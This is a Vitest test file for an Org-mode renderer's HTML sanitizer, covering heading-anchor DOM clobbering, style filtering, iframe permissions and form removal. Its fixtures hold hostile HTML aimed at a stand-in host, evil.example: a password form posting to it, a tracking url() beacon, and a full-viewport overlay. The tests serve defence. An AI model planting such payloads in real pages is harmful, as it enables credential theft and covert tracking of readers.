import { describe, expect, it } from "vitest"
import { JSDOM } from "jsdom"
import { sanitizeHtml } from "../src/renderer/sanitizer.js"
import { CLOBBERING_IDS } from "../src/parser/slug.js"
import { parse, renderToHtml } from "../src/index.js"

describe("sanitizer", () => {
  it("preserves landmarks, ARIA, role and table scope", () => {
    const out = sanitizeHtml(
      '<nav aria-label="Contents"><a href="#x">x</a></nav>' +
        '<main><table><thead><tr><th scope="col">H</th></tr></thead></table></main>',
    )
    expect(out).toContain("<nav")
    expect(out).toContain('aria-label="Contents"')
    expect(out).toContain("<main")
    expect(out).toContain('scope="col"')
  })

  it("strips scripts and inline event handlers", () => {
    const out = sanitizeHtml('<p onclick="evil()">hi</p><script>bad()</script>')
    expect(out).not.toContain("<script")
    expect(out).not.toContain("onclick")
  })

  it("scopes the style attribute to code elements ([D-07])", () => {
    const out = sanitizeHtml(
      '<div style="color:red">a</div>' +
        '<pre style="background:#000"><span style="color:#fff">x</span></pre>' +
        '<code style="color:#00f">y</code>',
    )
    // Inline style is stripped off a plain <div>…
    expect(out).not.toContain('<div style')
    // …but preserved on the highlighter's pre/span and on inline code.
    expect(out).toContain('<pre style="background:#000"')
    expect(out).toContain('<span style="color:#fff"')
    expect(out).toContain('<code style="color:#00f"')
  })
})

/*
 * DOM CLOBBERING vs THE HEADING ANCHOR (T1-2).
 *
 * DOMPurify's SANITIZE_DOM refuses any id/name whose value is already a property
 * of `document` or of a <form> — the defence against an author overwriting
 * document.body with an element. Org headings called "Images", "Links",
 * "Location" or "Name" produce exactly those ids, so the id was dropped while
 * the table of contents and every [[*Heading]] link went on pointing at it. The
 * anchors were dead and nothing said so.
 */
const ANCHOR_DOC = `#+TITLE: Anchors
#+OPTIONS: toc:t

See [[*Images]] and [[*Location]].

* Overview
* Images
* Links
* Location
* Name
* Plugins
`

const idsOf = (html: string) => [...html.matchAll(/\sid="([^"]+)"/g)].map((m) => m[1])
const fragmentsOf = (html: string) => [...html.matchAll(/href="#([^"]+)"/g)].map((m) => m[1])

describe("heading anchors survive SANITIZE_DOM (T1-2)", () => {
  it("leaves no dangling #fragment under the default sanitizer", async () => {
    const { html } = await renderToHtml(parse(ANCHOR_DOC), { sanitize: true, codeHighlight: false })
    const ids = new Set(idsOf(html))
    const dangling = fragmentsOf(html).filter((f) => !ids.has(f))
    expect(dangling).toEqual([])
  })

  it("produces the same ids with the sanitizer on and off", async () => {
    const on = await renderToHtml(parse(ANCHOR_DOC), { sanitize: true, codeHighlight: false })
    const off = await renderToHtml(parse(ANCHOR_DOC), { sanitize: false, codeHighlight: false })
    expect(idsOf(on.html)).toEqual(idsOf(off.html))
  })

  it("suffixes a clobbering heading id rather than losing it", async () => {
    const { html } = await renderToHtml(parse(ANCHOR_DOC), { sanitize: true, codeHighlight: false })
    expect(html).toContain('id="images-section"')
    expect(html).toContain('id="location-section"')
    // A name that cannot clobber is left exactly as it was.
    expect(html).toContain('id="overview"')
  })
})

/*
 * A GATE THAT CANNOT FAIL IS WORSE THAN NO GATE [#37].
 *
 * The clobbering set is a frozen literal so the parser stays pure — it must not
 * boot jsdom to slug a heading. A frozen list can drift from the DOM it claims
 * to describe, so this test runs DOMPurify's OWN check against a live jsdom
 * window and refuses any difference. A jsdom upgrade that adds or removes a
 * property fails here rather than silently un-fixing the anchors.
 */
describe("the clobbering-id list matches the live DOM", () => {
  it("equals every slug-shaped property of document and <form>", () => {
    const { window } = new JSDOM("")
    const doc = window.document
    const form = doc.createElement("form")

    const names = new Set<string>()
    for (const obj of [doc, form]) {
      let o: object | null = obj
      while (o) {
        for (const k of Object.getOwnPropertyNames(o)) names.add(k)
        o = Object.getPrototypeOf(o)
      }
    }
    // A slug is lowercase [a-z0-9] joined by single hyphens, so only names of
    // that shape can ever come out of slugify() and collide.
    const live = [...names].filter((n) => /^[a-z0-9]+(-[a-z0-9]+)*$/.test(n)).sort()

    expect([...CLOBBERING_IDS].sort()).toEqual(live)
    // And the check itself is the one DOMPurify runs.
    for (const id of live) expect(id in doc || id in form).toBe(true)
  })
})

/*
 * <style> AND THE UNGUARDED style ATTRIBUTE (T2-2).
 *
 * [D-07] scoped the style ATTRIBUTE to PRE/CODE/SPAN so the highlighter's inline
 * colours survive. The hook that does it only ever looked at the tag name, so on
 * those three tags ANY declaration was allowed through — including a full-viewport
 * overlay, and a background url() that reports back to whoever authored it. The
 * <style> ELEMENT was not filtered at all, so an export block could restyle or
 * blank the whole page. The engine never emits <style> into the body itself.
 */
describe("T2-2 — the sanitizer's <style> and inline declarations", () => {
  it("removes a <style> element outright", () => {
    const out = sanitizeHtml("<p>before</p><style>body{display:none}</style><p>after</p>")
    expect(out).not.toContain("<style")
    expect(out).not.toContain("display:none")
    expect(out).toContain("before")
    expect(out).toContain("after")
  })

  it("refuses a full-viewport overlay on a span", () => {
    const out = sanitizeHtml(
      '<span style="position:fixed;inset:0;background:url(https://evil.example/px.gif)">x</span>',
    )
    expect(out).not.toContain("position")
    expect(out).not.toContain("evil.example")
    expect(out).toContain("x")
  })

  it("refuses a url() even in an allowed property", () => {
    const out = sanitizeHtml('<code style="background-color:url(https://evil.example/p.gif)">y</code>')
    expect(out).not.toContain("evil.example")
    expect(out).not.toContain("url(")
  })

  it("refuses a declaration hidden behind a comment", () => {
    const out = sanitizeHtml('<span style="color:red/*x*/;position:fixed">z</span>')
    expect(out).not.toContain("position")
  })

  it("keeps the highlighter's css-variable colours", () => {
    const out = sanitizeHtml(
      '<pre style="background-color: var(--shiki-color-background)">' +
        '<span style="color: var(--shiki-token-keyword)">const</span></pre>',
    )
    expect(out).toContain("var(--shiki-color-background)")
    expect(out).toContain("var(--shiki-token-keyword)")
  })

  it("keeps a hex colour from a non-variable code theme", () => {
    const out = sanitizeHtml('<span style="color:#79c0ff">x</span>')
    expect(out).toContain("#79c0ff")
  })

  it("keeps the plain geometry the engine's own showcase authors", () => {
    // tests/fixtures/showcase.org draws its spacing scale with these; width and
    // height are geometry, and cannot overlay, position or fetch anything.
    const out = sanitizeHtml('<span style="width:4px;height:4px"></span>')
    expect(out).toContain("width:4px")
    expect(out).toContain("height:4px")
  })

  it("still strips the attribute from a tag outside the allowed three", () => {
    expect(sanitizeHtml('<div style="color:red">a</div>')).not.toContain("style")
  })
})

/*
 * T3-11 — the two things authored HTML could still do.
 *
 * The iframe SRC gate is tight (nocookie host, an 11-character id) but `allow`
 * was whatever the author wrote, so an embed a reader takes for a video could
 * ask for camera and microphone. And DOMPurify permits form elements by default,
 * so an export block could post a password field to a third party from a page
 * that otherwise looks like an article.
 */
describe("T3-11 — embeds ask for only what an embed needs", () => {
  const EMBED = 'https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ'

  it("replaces an author's allow with the embed set", () => {
    const out = sanitizeHtml(
      `<iframe src="${EMBED}" allow="camera; microphone; geolocation; payment"></iframe>`,
    )
    expect(out).toContain("<iframe")
    expect(out).not.toContain("camera")
    expect(out).not.toContain("microphone")
    expect(out).not.toContain("geolocation")
    expect(out).not.toContain("payment")
    expect(out).toContain("picture-in-picture")
  })

  it("gives an embed that asked for nothing the same set", () => {
    const out = sanitizeHtml(`<iframe src="${EMBED}"></iframe>`)
    expect(out).toMatch(/allow="[^"]*encrypted-media/)
  })

  it("still removes an iframe pointing anywhere else", () => {
    expect(sanitizeHtml('<iframe src="https://evil.example/x"></iframe>')).not.toContain("<iframe")
  })
})

describe("T3-11 — form elements are refused in a document body", () => {
  it("removes a third-party credential form", () => {
    const out = sanitizeHtml(
      '<form action="https://evil.example/collect" method="post">' +
        '<input type="password" name="p"><button>Go</button></form>',
    )
    expect(out).not.toContain("<form")
    expect(out).not.toContain("<input")
    expect(out).not.toContain("evil.example")
  })

  it("keeps the disabled checkbox an Org task item renders", () => {
    // The gap that let a regression through: nothing asserted the engine's OWN
    // checkbox survived sanitization, because the golden renders with it off.
    const out = sanitizeHtml(
      '<li class="org-li--checkbox" data-checkbox="checked">' +
        '<input type="checkbox" disabled checked aria-label="checked"> done</li>',
    )
    expect(out).toContain('type="checkbox"')
    expect(out).toContain('aria-label="checked"')
  })

  it("removes any other kind of input", () => {
    const out = sanitizeHtml(
      '<input type="password" name="p"><input type="text" name="u"><input type="email">',
    )
    expect(out).not.toContain("password")
    expect(out).not.toContain('type="text"')
    expect(out).not.toContain('type="email"')
  })

  it("keeps <button>, which the engine emits for code chrome and tabs", () => {
    // A button outside a form cannot submit anywhere, formaction only means
    // something inside one, and handlers are stripped — so refusing it would
    // break the engine's own output to remove nothing.
    const out = sanitizeHtml('<button class="org-src-copy" data-copy="x">Copy</button>')
    expect(out).toContain("<button")
    expect(out).toContain("org-src-copy")
  })

  it("still refuses a form even when a button sits inside it", () => {
    const out = sanitizeHtml('<form action="https://evil.example/x"><button>Go</button></form>')
    expect(out).not.toContain("<form")
    expect(out).not.toContain("evil.example")
  })

  it("removes select and textarea too", () => {
    const out = sanitizeHtml("<select><option>a</option></select><textarea>b</textarea>")
    expect(out).not.toContain("<select")
    expect(out).not.toContain("<textarea")
  })

  it("leaves ordinary prose alone", () => {
    const out = sanitizeHtml("<p>A form is a <code>form</code> element.</p>")
    expect(out).toContain("<p>")
    expect(out).toContain("<code>form</code>")
  })
})
